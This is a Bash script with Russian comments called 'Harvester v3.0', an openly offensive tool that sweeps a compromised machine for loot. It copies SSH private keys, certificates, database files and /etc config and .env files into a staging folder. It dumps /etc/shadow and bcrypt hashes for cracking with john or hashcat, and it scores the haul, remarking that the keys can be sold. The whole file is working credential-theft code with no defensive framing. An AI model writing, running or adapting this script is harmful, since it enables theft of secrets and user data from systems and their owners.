#!/bin/bash
# Harvester v3.0 — умный сборщик с классификацией
HARV_DIR="$HOME/shadow_harvest_$(date +%H%M)"
mkdir -p "$HARV_DIR/keys" "$HARV_DIR/db" "$HARV_DIR/configs" "$HARV_DIR/logs" "$HARV_DIR/hashes"

echo "[HARVEST v3] Собираю и классифицирую артефакты..."

# Ключи и сертификаты (высшая ценность)
find / -name "id_rsa" -o -name "*.pem" -o -name "*.key" -o -name "*.crt" 2>/dev/null | while read f; do
    cp "$f" "$HARV_DIR/keys/" 2>/dev/null
    echo "  🔑 KEY: $f"
done

# Базы данных (высокая ценность)
find / -name "*.sql" -o -name "*.db" -o -name "*.sqlite" -o -name "*.mdb" 2>/dev/null | head -20 | while read f; do
    cp "$f" "$HARV_DIR/db/" 2>/dev/null
    echo "  🗄️ DB: $f"
done

# Конфиги (средняя ценность)
find /etc -name "*.conf" -o -name "*.ini" -o -name "*.yaml" -o -name "*.env" 2>/dev/null | head -20 | while read f; do
    cp "$f" "$HARV_DIR/configs/" 2>/dev/null
    echo "  ⚙️ CONFIG: $f"
done

# Хеши паролей (для john/hashcat)
cat /etc/shadow 2>/dev/null > "$HARV_DIR/hashes/shadow.txt"
grep -rE '\$2[ayb]\$' /etc 2>/dev/null | head -10 > "$HARV_DIR/hashes/bcrypt.txt"

# Отчёт о ценности
echo "[HARVEST v3] Оценка добычи:"
echo "  🥇 Ключей: $(ls "$HARV_DIR/keys" | wc -l) (можно продать)"
echo "  🥈 Баз данных: $(ls "$HARV_DIR/db" | wc -l) (данные пользователей)"
echo "  🥉 Конфигов: $(ls "$HARV_DIR/configs" | wc -l) (доступ к сервисам)"
echo "  📊 Хешей: $(wc -l < "$HARV_DIR/hashes/shadow.txt") (для взлома)"
